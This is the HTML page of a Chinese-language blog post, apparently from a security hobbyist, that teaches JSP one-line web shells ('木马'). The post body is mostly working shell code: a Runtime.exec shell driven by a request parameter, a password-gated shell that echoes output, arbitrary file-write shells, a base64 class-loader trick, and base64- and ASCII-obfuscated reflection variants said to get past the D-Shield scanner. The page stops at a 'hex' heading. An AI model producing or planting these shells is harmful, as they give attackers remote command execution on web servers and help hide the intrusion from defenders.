@@ -1,0 +1,1227 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+<script>
+(function(){
+ if(''){
+ if (prompt('请输入文章密码') !== ''){
+                 alert('密码错误！');
+                                 history.back();
+                                             
+ }
+         
+ }
+     
+ })();
+</script>
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-mac-osx.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="v1rus blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="0x01 前言​    为了java，系统总结一下jsp一句话！ 0x02​    直接开始，从最初级的执行系统命令 一： 执行系统命令​    无回显：（执行之后不会回显，直接弹shell） 1&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;p&quot;));%&gt;  ​    有回显：（外带密码验证的） 12345678910111213&amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="jsp一句话木马&#x2F;jsp一句话木马">
+<meta property="og:url" content="https://virusday.github.io/2020/12/08/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/index.html">
+<meta property="og:site_name" content="v1rus blog">
+<meta property="og:description" content="0x01 前言​    为了java，系统总结一下jsp一句话！ 0x02​    直接开始，从最初级的执行系统命令 一： 执行系统命令​    无回显：（执行之后不会回显，直接弹shell） 1&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;p&quot;));%&gt;  ​    有回显：（外带密码验证的） 12345678910111213&amp;">
+<meta property="og:image" content="https://virusday.github.io/2020/12/08/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image-20201208111458239.png">
+<meta property="og:image" content="https://virusday.github.io/2020/12/08/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image-20201208163725862.png">
+<meta property="og:image" content="https://virusday.github.io/2020/12/08/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/2020.png">
+<meta property="article:published_time" content="2020-12-08T02:49:41.085Z">
+<meta property="article:modified_time" content="2020-12-09T06:41:16.228Z">
+<meta property="article:author" content="Virusday">
+<meta property="article:tag" content="Learn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://virusday.github.io/2020/12/08/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image-20201208111458239.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://virusday.github.io/2020/12/08/jsp一句话木马/jsp一句话木马/"/>
+
+
+
+
+
+  <title>jsp一句话木马/jsp一句话木马 | v1rus blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<script type="text/javascript" src="/lib/clipboard/clipboard.js"></script>
+<script type="text/javascript" src="/js/src/custom.js"></script>
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">v1rus blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">做些有意思的事</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://virusday.github.io/2020/12/08/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Virusday">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/user.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="v1rus blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">jsp一句话木马/jsp一句话木马</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-12-08T10:49:41+08:00">
+                2020-12-08
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2020-12-09T14:41:16+08:00">
+                2020-12-09
+              </time>
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1.8k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  8
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>​    为了java，系统总结一下jsp一句话！</p>
+<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>​    直接开始，从最初级的执行系统命令</p>
+<h3 id="一：-执行系统命令"><a href="#一：-执行系统命令" class="headerlink" title="一： 执行系统命令"></a>一： 执行系统命令</h3><p>​    无回显：（执行之后不会回显，直接弹shell）</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%Runtime.getRuntime().exec(request.getParameter(<span class="string">"p"</span>));%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>​    有回显：（外带密码验证的）</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">	<span class="keyword">if</span>(<span class="string">"v1rus"</span>.equals(request.getParameter(<span class="string">"pwd"</span>)))&#123;</span><br><span class="line">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(<span class="string">"p"</span>)).getInputStream();</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line">        out.print(<span class="string">"&lt;pre&gt;"</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">            out.print(<span class="keyword">new</span> String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(<span class="string">"&lt;/pre&gt;"</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>其实上述的代码可能会在实际windows操作系统中带来乱码的问题，所以在文件头上加上这两句话可以解决jsp的乱码问题</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;GBK&quot;%&gt;</span><br><span class="line">&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;gb2312&quot;%&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/12/08/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image-20201208111458239.png" alt="image-20201208111458239"></p>
+<p>再详细说一下这里的参数：</p>
+<p>​        <code>Runtime</code> 类封装了运行时的环境。每个 Java 应用程序都有一个 <code>Runtime</code> 类实例，使应用程序能够与其运行的环境相连接。使用 <code>getRuntime()</code> 构建 <code>Runtime</code> 类实例。 <code>getRuntime()</code> 返回与当前 Java 应用程序相关的运行时对象。获取实例后调用 <code>exec()</code> 方法执行系统命令。</p>
+<p>  <code>request</code> 为 JSP 内置对象，<code>getParameter()</code> 方法获取请求参数 <code>cmd</code>的值构建命令 。</p>
+<h3 id="二、把字符串编码后写入指定文件的："><a href="#二、把字符串编码后写入指定文件的：" class="headerlink" title="二、把字符串编码后写入指定文件的："></a>二、把字符串编码后写入指定文件的：</h3><p>1、</p>
+<p>①写入绝对路径:</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="keyword">new</span> java.io.FileOutputStream(request.getParameter(<span class="string">"f"</span>)).wirte(request.getParameter(<span class="string">"c"</span>).getBytes());%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>请求：<a href="http://localhost:8081/shell/cmd4.jsp?f=D://v1rus.txt&amp;c=v1rus" target="_blank" rel="noopener">http://localhost:8081/shell/cmd4.jsp?f=D://v1rus.txt&amp;c=v1rus</a></p>
+<p>②写入web目录</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="keyword">new</span> java.io.FileOutputStream(application.getRealPath(<span class="string">"/"</span>)+<span class="string">"/"</span>+request.getParameter(<span class="string">"f"</span>)).write(request.getParameter(<span class="string">"c"</span>).getBytes());%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>请求：<a href="http://localhost:8081/shell/cmd5.jsp?f=2.txt&amp;c=v1rus" target="_blank" rel="noopener">http://localhost:8081/shell/cmd5.jsp?f=2.txt&amp;c=v1rus</a></p>
+<p>2、</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="keyword">new</span> java.io.RandomAccessFile(request.getParameter(<span class="string">"f"</span>),<span class="string">"rw"</span>).write(request.getParameter(<span class="string">"c"</span>).getBytes()); %&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="keyword">new</span> java.io.RandomAccessFile(application.getRealPath(<span class="string">"/"</span>)+<span class="string">"/"</span>+request.getParameter(<span class="string">"f"</span>),<span class="string">"rw"</span>).write(request.getParameter(<span class="string">"c"</span>).getBytes()); %&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="四、-反射调用外部jar包"><a href="#四、-反射调用外部jar包" class="headerlink" title="四、 反射调用外部jar包"></a>四、 反射调用外部jar包</h3><p><strong>jar -cvf 【打包后的文件名】.jar 【要打包的目录】。</strong></p>
+<h2 id="0x03-免杀！"><a href="#0x03-免杀！" class="headerlink" title="0x03 免杀！"></a>0x03 免杀！</h2><h3 id="类加载"><a href="#类加载" class="headerlink" title="类加载"></a>类加载</h3><p>​    学习冰蝎作者利用二进制加密实现新型的一句话木马。对于类加载是直接传送二进制的字节码（<strong>动态解析</strong>）。</p>
+<p>​    java执行代码的时候要先编译成.class字节码的文件才能被jvm所执行。如果实现任意class文件的加载，相当于实现了php中eval命令执行函数。</p>
+<p>​    我这里先贴实现的代码，等会再讲目前没办法实现的事。</p>
+<p>首先命令执行类Calc</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> obfuscate;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Calc</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"calc.exe"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"OK"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>主运行程序类Loader</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> obfuscate;</span><br><span class="line"><span class="keyword">import</span> sun.misc.BASE64Decoder;</span><br><span class="line"><span class="keyword">import</span> sun.misc.BASE64Encoder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Loader</span> </span>&#123;</span><br><span class="line">    <span class="comment">//实现二进制文件转成base64</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">encodeBase64File</span><span class="params">(String path)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(path);;</span><br><span class="line">        FileInputStream inputFile = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line">        <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[(<span class="keyword">int</span>) file.length()];</span><br><span class="line">        inputFile.read(buffer);</span><br><span class="line">        inputFile.close();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> BASE64Encoder().encode(buffer);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Myloader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> //继承<span class="title">ClassLoader</span></span></span><br><span class="line"><span class="class">        </span>&#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span>  Class <span class="title">get</span><span class="params">(<span class="keyword">byte</span>[] b)</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">super</span>.defineClass(b, <span class="number">0</span>, b.length);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            String classStr=<span class="string">"yv66vgAAADQAKQoACQAZCgAaABsIABwKABoAHQcAHgoABQAfCAAgBwAhBwAiAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABBMb2JmdXNjYXRlL0NhbGM7AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlBwAeAQAKU291cmNlRmlsZQEACUNhbGMuamF2YQwACgALBwAjDAAkACUBAAhjYWxjLmV4ZQwAJgAnAQATamF2YS9pby9JT0V4Y2VwdGlvbgwAKAALAQACT0sBAA5vYmZ1c2NhdGUvQ2FsYwEAEGphdmEvbGFuZy9PYmplY3QBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlACEACAAJAAAAAAACAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAABAAOAAAADAABAAAABQAPABAAAAABABEAEgABAAwAAABtAAIAAgAAABS4AAISA7YABFenAAhMK7YABhIHsAABAAAACQAMAAUAAwANAAAAFgAFAAAACAAJAAsADAAJAA0ACgARAAwADgAAABYAAgANAAQAEwAUAAEAAAAUAA8AEAAAABUAAAAHAAJMBwAWBAABABcAAAACABg="</span>; <span class="comment">// Calc.class的base64编码</span></span><br><span class="line">            BASE64Decoder code=<span class="keyword">new</span> sun.misc.BASE64Decoder();</span><br><span class="line">            String re = encodeBase64File(<span class="string">"E:\\ideaworkspace\\Obfuscate\\out\\production\\Obfuscate\\obfuscate\\Calc.class"</span>);</span><br><span class="line">            <span class="comment">//System.out.println(re);</span></span><br><span class="line">            Class result=<span class="keyword">new</span> Myloader().get(code.decodeBuffer(classStr));<span class="comment">//将base64解码成byte数组，并传入t类的get函数</span></span><br><span class="line">            System.out.println(result.newInstance().toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以成功弹出计算机</p>
+<p><img src="/2020/12/08/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image-20201208163725862.png" alt="image-20201208163725862"></p>
+<p>​    </p>
+<p>​    这里后面有想过缩短.class文件的二进制直接构造一个类写静态块代码执行。</p>
+<p>​    但是其实可以看<code>Class result=new Myloader().get(code.decodeBuffer(classStr));</code>，这里生成的是Class类，不能强转为Calc类所以也不会执行静态代码块里面的内容，只能重写toString方法完成<code>Runtime.getRuntime().exec(&quot;calc.exe&quot;);</code></p>
+<h3 id="过d盾"><a href="#过d盾" class="headerlink" title="过d盾"></a>过d盾</h3><p>这里先贴一下jsp的基本用法和过d盾</p>
+<h4 id="JSP标签"><a href="#JSP标签" class="headerlink" title="JSP标签"></a>JSP标签</h4><p>在JSP页面中嵌入java代码，首先要了解一下JSP标签的基本知识。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ %&gt;    页面指令，设定页面属性和特征信息</span><br><span class="line">&lt;% %&gt;     java代码片段，不能在此声明方法</span><br><span class="line">&lt;%! %&gt;    java代码声明，声明全局变量或当前页面的方法</span><br><span class="line">&lt;%&#x3D; %&gt;    Java表达式</span><br></pre></td></tr></table></figure>
+
+
+
+<p>base64免杀过d盾</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"sun.misc.BASE64Decoder"</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(request.getParameter(<span class="string">"cmd"</span>)!=<span class="keyword">null</span>)&#123;</span><br><span class="line">        BASE64Decoder decoder = <span class="keyword">new</span> BASE64Decoder();</span><br><span class="line">        Class rt = Class.forName(<span class="keyword">new</span> String(decoder.decodeBuffer(<span class="string">"amF2YS5sYW5nLlJ1bnRpbWU="</span>)));<span class="comment">//java.lang.Runtime</span></span><br><span class="line">        Process e = (Process) <span class="comment">//exec  getRuntime</span></span><br><span class="line">                rt.getMethod(<span class="keyword">new</span> String(decoder.decodeBuffer(<span class="string">"ZXhlYw=="</span>)), String<span class="class">.<span class="keyword">class</span>).<span class="title">invoke</span>(<span class="title">rt</span>.<span class="title">getMethod</span>(<span class="title">new</span></span></span><br><span class="line">                        String(decoder.decodeBuffer("Z2V0UnVudGltZQ=="))).invoke(null, new</span><br><span class="line">                        Object[]&#123;&#125;), request.getParameter(<span class="string">"cmd"</span>) );</span><br><span class="line">        java.io.InputStream in = e.getInputStream();</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line">        out.print(<span class="string">"&lt;pre&gt;"</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">            out.println(<span class="keyword">new</span> String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(<span class="string">"&lt;/pre&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>同理可以使用hex和ascii的编码绕过</p>
+<p>ascii</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span>  language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(request.getParameter(<span class="string">"cmd"</span>)!=<span class="keyword">null</span>)&#123;</span><br><span class="line">        Class rt = Class.forName(<span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[] &#123; <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">46</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">46</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span> &#125;));</span><br><span class="line">        Process e = (Process) rt.getMethod(new String(new byte[] &#123; 101, 120, 101, 99 &#125;), String.class).invoke(rt.getMethod(new String(new byte[] &#123; 103, 101, 116, 82, 117, 110, 116, 105, 109, 101 &#125;)).invoke(null), request.getParameter("cmd") );</span><br><span class="line">        java.io.InputStream in = e.getInputStream();</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;<span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];out.print(<span class="string">"&lt;pre&gt;"</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123; out.println(<span class="keyword">new</span> String(b)); &#125;out.print(<span class="string">"&lt;/pre&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>hex</p>
